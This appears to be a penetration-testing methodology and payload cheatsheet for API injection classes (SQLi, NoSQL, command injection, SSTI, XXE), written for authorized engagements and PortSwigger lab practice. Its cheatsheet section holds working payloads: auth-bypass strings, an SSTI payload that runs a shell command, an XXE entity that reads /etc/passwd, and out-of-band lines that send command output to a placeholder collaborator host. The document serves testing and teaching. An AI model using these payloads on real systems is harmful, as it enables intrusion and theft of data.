# API Injection Testing — Unified Methodology & Cheatsheet

This file consolidates the testing workflow across all injection classes covered in
this series into a single repeatable methodology, plus a quick-reference cheatsheet
for use during live engagements. Refer back to the individual files for full
payload breakdowns and reasoning — this file intentionally omits detailed
explanations in favor of speed of reference.

---

## 1. Unified Testing Methodology

### Phase 1 — Reconnaissance & Surface Mapping

1. Collect every API endpoint via:
   - OpenAPI/Swagger spec (`/swagger.json`, `/openapi.json`, `/v2/api-docs`,
     `/api-docs`)
   - Postman collection (if provided or discoverable)
   - Mobile app traffic capture (proxy-aware emulator/device through Burp)
   - JavaScript source analysis (SPA `fetch`/`axios` calls) — check bundled JS for
     endpoint paths not present in any published documentation
   - Directory/endpoint brute-forcing as a last resort (`ffuf`, Burp Intruder against
     common API path wordlists)
2. For each endpoint, record: method, full JSON body schema (including nested
   objects and arrays), documented `Content-Type`, and authentication requirement.
3. Flag high-probability injection targets by field semantics:
   - Filename/path/URL-like fields → command injection, XXE (file upload variants)
   - Search/filter/query fields → SQLi, NoSQL injection
   - Any field with `username`, `email`, `token`, `id`, or auth-adjacent names →
     NoSQL operator injection priority
   - Message/template/preview/notification fields → SSTI priority
   - Any endpoint accepting file uploads or declaring multiple `consumes` types →
     XXE priority

### Phase 2 — Baseline Establishment

For every flagged endpoint, capture and save:
- A clean baseline request/response (status, body, response time — average of 3-5
  requests to account for jitter)
- Response for a clearly invalid input (to distinguish "processed successfully with
  altered logic" from "input was simply rejected")

### Phase 3 — Injection Point Confirmation (Fast Probes)

Test each of the following as a drop-in replacement for every string-typed field —
including nested fields at every depth, and array elements individually:

| Class | Minimal probe payload | Positive signal |
|---|---|---|
| SQLi | `'` (single quote) | 500 error, DB error string in JSON body, or response delta vs. baseline |
| SQLi (blind) | `' AND 1=1-- -` vs `' AND 1=2-- -` | Response delta between true/false pair |
| NoSQL | `{"$ne": null}` replacing a string value | Auth bypass / unexpected match |
| Command injection | `; sleep 5` or `\| sleep 5` | ~5s response time delta |
| SSTI | `{{7*7}}` | `49` appears in response |
| XXE | Swap `Content-Type` to `application/xml` with equivalent XML body | Non-415/406 response |

### Phase 4 — Type & Content-Type Confusion Sweep

Independent of the above, run these structural probes against every endpoint
regardless of field content:

- Replace a scalar string field with an object: `{"$gt": ""}`, `{"$ne": null}`
- Replace a scalar string field with an array: `["value"]`
- Swap `Content-Type` header: `application/json` → `application/xml`,
  `text/xml`, `application/x-www-form-urlencoded`
- Send query-string bracket-notation NoSQL payloads against GET endpoints:
  `?field[$ne]=null`

### Phase 5 — Escalation

Only after confirmation in Phase 3/4:
1. Move from confirmation payload to data-extraction or code-execution payload
   per the relevant file's Section 3+ techniques.
2. Prefer boolean/time-based blind techniques before assuming OOB is required;
   set up Burp Collaborator/interactsh proactively for SSTI and command injection
   testing specifically, since blind delivery is the common case for both.
3. Respect engagement/program scope and rules of engagement at every escalation
   step — confirm impact with minimal, non-destructive commands/queries first.

### Phase 6 — Documentation

For each confirmed finding, record:
- Full request/response pair (redacting any unintended sensitive data exposure
  beyond what's needed to demonstrate impact)
- Exact injection point (field path, including nesting, e.g.
  `job.target.host`)
- Payload used, with the piece-by-piece breakdown (what closes the original
  context, what the injected logic does)
- Confirmation method (in-band reflection / boolean delta / timing delta / OOB
  callback)
- Business impact framed in terms relevant to the target (data exposure scope,
  auth bypass reach, RCE/system impact)

---

## 2. Quick-Reference Payload Cheatsheet

### SQLi (JSON body)

```json
{"field": "' OR '1'='1"}
{"field": "' UNION SELECT NULL,NULL-- -"}
{"field": "1 AND 1=1"}
{"field": "1 AND (SELECT SLEEP(5))"}
```
Escaped double-quote variant: `"field": "test\" OR \"1\"=\"1"`

### NoSQL (MongoDB operator injection)

```json
{"password": {"$ne": null}}
{"password": {"$gt": ""}}
{"username": {"$regex": "^admin"}}
{"username": {"$where": "this.username == 'admin' || '1'=='1'"}}
```
Query-string variant: `?password[$ne]=null`

### Command Injection (JSON body)

```json
{"host": "8.8.8.8; whoami"}
{"host": "8.8.8.8 && whoami"}
{"host": "8.8.8.8; sleep 10"}
{"host": "8.8.8.8; nslookup $(whoami).oob.COLLABORATOR"}
```

### SSTI (JSON body — engine detection)

```json
{"message": "{{7*7}}"}          // Jinja2/Twig -> 49
{"message": "${7*7}"}           // Freemarker/EL -> 49
{"message": "#{7*7}"}           // Ruby-based -> 49
{"message": "{{7*'7'}}"}        // Jinja2 disambiguation -> 7777777
```
RCE (Jinja2):
```json
{"message": "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"}
```

### XXE (Content-Type confusion)

Header swap: `Content-Type: application/json` → `application/xml`

```xml
<?xml version="1.0"?>
<!DOCTYPE order [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<order><productId>&xxe;</productId></order>
```
Blind/OOB:
```xml
<?xml version="1.0"?>
<!DOCTYPE order [
  <!ENTITY % xxe SYSTEM "http://COLLABORATOR/xxe-probe">
  %xxe;
]>
<order><productId>1001</productId></order>
```

---

## 3. JSON Escaping Quick Reference

| Raw character needed in payload | JSON-safe encoding |
|---|---|
| `"` | `\"` |
| `\` | `\\` |
| newline | `\n` |
| tab | `\t` |
| Unicode char | `\uXXXX` |

Rule of thumb: if your payload contains no `"` or `\`, it is almost always
JSON-safe as-is. Only SQLi payloads targeting double-quote-delimited SQL dialects
and some XXE/SSTI edge cases require explicit escaping — verify by checking the
raw payload against this table before sending.

---

## 4. Consolidated PortSwigger Lab Progression

Recommended order when working through labs specifically to build the JSON/API
adaptation skill referenced throughout this series (assumes the standalone web-app
series labs are already completed as prerequisites):

1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
2. SQL injection UNION attack, determining the number of columns returned by the query
3. Blind SQL injection with conditional responses
4. Blind SQL injection with time delays
5. OS command injection, simple case
6. Blind OS command injection with time delays
7. Blind OS command injection with out-of-band interaction
8. Basic server-side template injection
9. Server-side template injection using documentation
10. Exploiting XXE using external entities to retrieve files
11. Blind XXE with out-of-band interaction

For each, after completing the lab in its native (form/query-string) context,
re-derive the equivalent JSON-body request manually and note any escaping
differences — this manual adaptation step is the actual skill this series builds,
since no current PortSwigger lab tests JSON delivery directly (see gap disclosures
in each individual file).

---

## 5. Tooling Summary

| Tool | Use in API injection testing |
|---|---|
| Burp Suite (Inspector) | Parsed JSON tree editing without manual brace-tracking |
| Burp Intruder | Automated payload sweeps with `§` markers placed inside JSON string values |
| Burp Collaborator | OOB confirmation for blind command injection, SSTI, XXE |
| Param Miner (extension) | Discover undocumented/hidden JSON keys |
| Postman/Insomnia | Import OpenAPI specs, proxy through Burp for full endpoint capture |
| crAPI / VAmPI / NodeGoat | Purpose-built vulnerable API targets for hands-on practice where PortSwigger lab coverage has gaps |

---

## 6. Cross-File Index

- `01-api-injection-context-overview.md` — delivery-layer differences, tooling setup
- `02-sqli-via-api.md` — SQLi through JSON bodies
- `03-nosql-injection-via-api.md` — MongoDB operator injection
- `04-command-injection-via-api.md` — OS command injection via API parameters
- `05-ssti-via-api.md` — Template injection through API string fields
- `06-xxe-via-api.md` — XXE via content-type confusion
- `07-methodology-and-cheatsheet.md` — this file
